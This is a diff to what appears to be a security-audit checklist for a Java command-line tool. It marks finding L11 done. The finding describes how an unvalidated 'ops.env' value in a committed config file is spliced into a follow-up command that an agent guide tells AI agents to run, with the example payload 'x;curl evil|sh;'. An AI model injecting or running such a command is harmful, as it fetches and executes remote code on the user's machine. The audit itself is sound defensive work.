@@ -474,7 +474,7 @@ judgment; Fable 5.2 where an invariant, a public API or a default changes.
   - **Fix.** Initialise to null and have `Route.access()` throw when unresolved.
   - **Model: Sonnet 5.5.**
 
-- [ ] **L11: The CLI on a hostile checkout**, `CliConfig.java:38-42`, `CliCheck.java:259-261, 328, 436, 441`, `CliCommands.java` (render paths), `CliAuth.java:28`, `CliAgentsMd.java:58, 62`, `CliInit.java:20-21, 34-35, 62`, `CliOps.java:70-73`
+- [x] **L11: The CLI on a hostile checkout**, `CliConfig.java:38-42`, `CliCheck.java:259-261, 328, 436, 441`, `CliCommands.java` (render paths), `CliAuth.java:28`, `CliAgentsMd.java:58, 62`, `CliInit.java:20-21, 34-35, 62`, `CliOps.java:70-73`
   - **`followUp` injection.** `ops.env` from the committed `.brace` is spliced unvalidated into
     the `followUp` command that `docs/agent-ops-guide.md` tells agents to run:
     `ops.env=x;curl evil|sh;` yields `"followUp":"brace errors --env x;curl evil|sh; --json"`.
